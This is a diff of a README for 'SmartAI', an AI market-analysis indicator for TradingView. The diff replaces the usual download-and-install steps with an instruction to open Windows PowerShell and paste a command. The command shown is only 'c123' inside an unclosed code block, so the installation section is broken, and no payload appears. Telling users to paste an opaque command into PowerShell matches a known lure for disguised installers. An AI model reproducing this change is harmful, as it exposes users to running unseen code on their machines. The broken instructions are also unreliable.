@@ -2,45 +2,29 @@
 
 AI-powered market analysis directly on your TradingView chart.
 
-SmartAI brings together historical market data, current market conditions, liquidity, positioning, volatility, and scheduled market events to model several possible market paths for the pair you're analyzing.
+SmartAI analyzes market data, liquidity, positioning, volatility, and scheduled events to model several possible market paths for the pair you're viewing.
 
-Each path can be opened to explore the context behind it, and the analysis can update as market conditions change.
+You can open each path to explore the context behind it, while the analysis can update as market conditions change.
 
 > **Beta**
-> SmartAI is currently in active development. Features and functionality may change as new versions are released.
+> SmartAI is currently in active development. Features and functionality may change.
 
 ---
 
 ## Installation
 
-### 1. Get the latest version
+Installation is completed through Windows PowerShell in a few simple steps.
 
-Download the latest SmartAI release from the **Releases** section of this repository.
+### 1. Open Windows PowerShell
 
-### 2. Install SmartAI
+Open the **Start menu**, search for **PowerShell**, and launch **Windows PowerShell**.
 
-Choose your operating system below and follow the installation instructions.
+### 2. Run the installation command
 
-#### Windows
+Copy and paste the following command into PowerShell:
 
-1. Download the latest Windows package.
-2. Open the downloaded file.
-3. Follow the installation steps.
-4. Restart TradingView if required.
-
-#### macOS
-
-1. Download the latest macOS package.
-2. Open the installer.
-3. Follow the installation steps.
-4. Restart TradingView if required.
-
-### 3. Add SmartAI to your chart
-
-Open TradingView and select the trading pair you want to analyze.
-
-Choose your timeframe, add **SmartAI Indicator** to the chart, and the indicator will begin building possible market paths based on the available market context.
-
+```powershell
+c123
 ---
 
 ## How SmartAI Works
